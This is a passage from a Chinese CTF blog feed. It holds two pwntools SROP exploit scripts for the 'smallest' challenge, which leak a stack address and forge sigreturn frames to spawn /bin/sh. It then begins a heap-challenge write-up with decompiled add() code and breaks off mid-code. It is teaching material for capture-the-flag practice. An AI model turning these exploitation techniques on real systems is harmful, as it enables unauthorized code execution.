&lt;h2 id=&#34;exp&#34;&gt;&lt;a href=&#34;#exp&#34; class=&#34;headerlink&#34; title=&#34;exp&#34;&gt;&lt;/a&gt;exp&lt;/h2&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;small = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./smallest&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; args[&lt;span class=&#34;string&#34;&gt;&amp;#x27;REMOTE&amp;#x27;&lt;/span&gt;]:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sh = remote(&lt;span class=&#34;string&#34;&gt;&amp;#x27;127.0.0.1&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;7777&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sh = process(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./smallest&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gdb.attach(sh)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.arch = &lt;span class=&#34;string&#34;&gt;&amp;#x27;amd64&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level = &lt;span class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;syscall_ret = &lt;span class=&#34;number&#34;&gt;0x00000000004000BE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;start_addr = &lt;span class=&#34;number&#34;&gt;0x00000000004000B0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = p64(start_addr) * &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(&lt;span class=&#34;string&#34;&gt;&amp;quot;\xb3&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stack_addr = u64(sh.recv()[&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.success(&lt;span class=&#34;string&#34;&gt;&amp;#x27;leak stack addr :&amp;#x27;&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(stack_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe = SigreturnFrame()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rax = constants.SYS_read&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rdi = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rsi = stack_addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rdx = &lt;span class=&#34;number&#34;&gt;0x400&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rsp = stack_addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rip = syscall_ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = p64(start_addr) + &lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;(sigframe)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigreturn = p64(syscall_ret) + &lt;span class=&#34;string&#34;&gt;b&amp;quot;b&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(sigreturn)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe = SigreturnFrame()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rax = constants.SYS_execve&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rdi = stack_addr + &lt;span class=&#34;number&#34;&gt;0x120&lt;/span&gt;  &lt;span class=&#34;comment&#34;&gt;# &amp;quot;/bin/sh&amp;quot; &amp;#x27;s addr&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rsi = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rdx = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rsp = stack_addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rip = syscall_ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;frame_payload = p64(start_addr) + &lt;span class=&#34;string&#34;&gt;b&amp;quot;b&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;(sigframe)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = frame_payload + (&lt;span class=&#34;number&#34;&gt;0x120&lt;/span&gt;-&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(frame_payload))*&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;b&amp;#x27;/bin/sh\x00&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(sigreturn)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;暴力破解解法&#34;&gt;&lt;a href=&#34;#暴力破解解法&#34; class=&#34;headerlink&#34; title=&#34;暴力破解解法&#34;&gt;&lt;/a&gt;暴力破解解法&lt;/h2&gt;&lt;p&gt;​		不过这个解法也是基于在本地能大概看一下偏移差多少的情况下，如果直接暴力破解的话，难度应该会更大一点&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-36-SROP/image-20230729210328031.png&#34; alt=&#34;image-20230729210328031&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;small = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./smallest&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh = process(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./smallest&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(sh)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.arch = &lt;span class=&#34;string&#34;&gt;&amp;#x27;amd64&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level = &lt;span class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;syscall_ret = &lt;span class=&#34;number&#34;&gt;0x00000000004000BE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;start_addr = &lt;span class=&#34;number&#34;&gt;0x00000000004000B0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = p64(start_addr) * &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(&lt;span class=&#34;string&#34;&gt;b&amp;quot;\xb3&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stack_addr = u64(sh.recv()[&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.success(&lt;span class=&#34;string&#34;&gt;&amp;#x27;leak stack addr :&amp;#x27;&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(stack_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigreturn = p64(syscall_ret) + &lt;span class=&#34;string&#34;&gt;b&amp;quot;b&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe = SigreturnFrame()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rax = constants.SYS_execve&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rdi = stack_addr  -&lt;span class=&#34;number&#34;&gt;0xa1f&lt;/span&gt;  &lt;span class=&#34;comment&#34;&gt;# &amp;quot;/bin/sh&amp;quot; &amp;#x27;s addr&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rsi = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rdx = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rsp = stack_addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rip = syscall_ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;frame_payload = p64(start_addr) + &lt;span class=&#34;string&#34;&gt;b&amp;quot;c&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;(sigframe)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = frame_payload + &lt;span class=&#34;string&#34;&gt;b&amp;#x27;/bin/sh\x00&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;90&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(sigreturn)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;h2 id=&#34;其他&#34;&gt;&lt;a href=&#34;#其他&#34; class=&#34;headerlink&#34; title=&#34;其他&#34;&gt;&lt;/a&gt;其他&lt;/h2&gt;&lt;p&gt;gdb中如何查看 sigframe结构?&lt;/p&gt;
&lt;p&gt;gdb查看结构体信息&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://wizardforcel.gitbooks.io/100-gdb-tips/content/set-print-pretty-on.html&#34;&gt;https://wizardforcel.gitbooks.io/100-gdb-tips/content/set-print-pretty-on.html&lt;/a&gt;&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2023-07-29T13:01:21.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-35-7%E6%9C%88%E6%9C%88%E8%B5%9Bpwn/</id>
        <title>pwn入门-35-7月月赛pwn</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-35-7%E6%9C%88%E6%9C%88%E8%B5%9Bpwn/"/>
        <content type="html">&lt;p&gt;题目链接: 本链接+&amp;#x2F;pwn&lt;/p&gt;
&lt;p&gt;​		一上来能看到是一个很明显的菜单堆题,并且有后门函数,很明显要劫持控制流,执行后门函数,但问题是没找到通用的漏洞,但是能看到add中,有很大一串逻辑,后来也看到了这里有关于后门函数的操作,以及存放puts函数的地址. &lt;/p&gt;
&lt;p&gt;​		确定思路大概是想办法操作堆块位置,布置好位置,把后门函数放到puts函数的位置,然后调用就可以了.&lt;/p&gt;
&lt;p&gt;​		不过后面看这逻辑看迷糊了….其实挺简单的逻辑, &lt;font color=&#34;red&#34;&gt;注意两点,一点是可以辅助画图,来帮助自己分析,另外一点是通过调试来帮助自己分析, 只用脑子想…脑子可能不太够用..&lt;/font&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;....&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;size:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  size = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __isoc99_scanf(&lt;span class=&#34;string&#34;&gt;&amp;quot;%u&amp;quot;&lt;/span&gt;, &amp;amp;size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( size &amp;lt;= &lt;span class=&#34;number&#34;&gt;0x200&lt;/span&gt; &amp;amp;&amp;amp; size &amp;gt; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( size_4 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; size_4 &amp;lt;= &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;; ++size_4 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !*((_QWORD *)&amp;amp;ptrs + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * size_4) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        dword_4068[&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; * size_4] = size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *((_QWORD *)&amp;amp;ptrs + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * size_4) = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(size);&lt;/span&gt;&lt;br&gt;&lt;span 